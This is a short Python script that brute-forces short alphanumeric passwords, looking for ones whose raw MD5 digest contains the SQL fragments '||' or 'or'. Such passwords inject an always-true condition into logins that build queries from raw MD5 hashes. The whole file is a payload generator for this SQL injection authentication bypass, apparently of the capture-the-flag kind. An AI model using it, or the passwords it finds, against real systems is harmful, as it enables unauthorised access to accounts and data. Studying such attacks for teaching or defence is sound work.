# -*- coding: utf-8 -*-
import string
import itertools
from hashlib import md5

if __name__ == "__main__":

    all_chars = string.ascii_letters + string.digits

    print("Trying 1 length passwords...")
    for val in itertools.product(all_chars, repeat=1):
        password = "".join(val)
        hash_password = md5(password.encode("latin-1")).digest().decode("latin-1")
        if "'||'" in hash_password:
            print(password)
            print(hash_password)
        if "'or'" in hash_password.lower():
            print(password)
            print(hash_password)

    print("Trying 2 length passwords...")
    for val in itertools.product(all_chars, repeat=2):
        password = "".join(val)
        hash_password = md5(password.encode("latin-1")).digest().decode("latin-1")
        if "'||'" in hash_password:
            print(password)
            print(hash_password)
        if "'or'" in hash_password.lower():
            print(password)
            print(hash_password)

    print("Trying 3 length passwords...")
    for val in itertools.product(all_chars, repeat=3):
        password = "".join(val)
        hash_password = md5(password.encode("latin-1")).digest().decode("latin-1")
        if "'||'" in hash_password:
            print(password)
            print(hash_password)
        if "'or'" in hash_password.lower():
            print(password)
            print(hash_password)

    print("Trying 4 length passwords...")
    for val in itertools.product(all_chars, repeat=4):
        password = "".join(val)
        hash_password = md5(password.encode("latin-1")).digest().decode("latin-1")
        if "'||'" in hash_password:
            print(password)
            print(hash_password)
        if "'or'" in hash_password.lower():
            print(password)
            print(hash_password)

    print("Trying 5 length passwords...")
    for val in itertools.product(all_chars, repeat=5):
        password = "".join(val)
        hash_password = md5(password.encode("latin-1")).digest().decode("latin-1")
        if "'||'" in hash_password:
            print(password)
            print(hash_password)
        if "'or'" in hash_password.lower():
            print(password)
            print(hash_password)
